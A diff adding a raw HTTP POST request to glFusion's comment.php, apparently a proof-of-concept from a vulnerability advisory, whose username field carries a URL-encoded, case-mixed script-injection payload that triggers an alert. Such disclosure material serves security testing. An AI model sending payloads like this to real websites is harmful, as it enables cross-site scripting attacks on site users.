@@ -1,0 +1,15 @@
+POST /comment.php HTTP/1.1
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash,
+application/xaml+xml, application/vnd.ms-xpsdocument, application/x-ms-xbap, application/x-ms-
+application, */*
+Accept-Language: da
+Content-Type: application/x-www-form-urlencoded
+UA-CPU: x86
+Accept-Encoding:
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)
+Host: www.glfusion.org
+Pragma: no-cache
+Connection: Keep-Alive
+sid=fileid_20&amp;pid=0&amp;type=filemgmt&amp;_glsectoken=&amp;comment=&amp;uid=1&amp;username=Anonymous+Use
+r%22%3e%3csCrIpT%3ealert(1234)%3c%2fsCrIpT%3e&amp;title=Hello&amp;comment=Hello&amp;comment_h
+tml=Hello&amp;postmode=html&amp;captcha=47TXJC&amp;csid=49816d4bcd4b&amp;mode=Submit+Comment
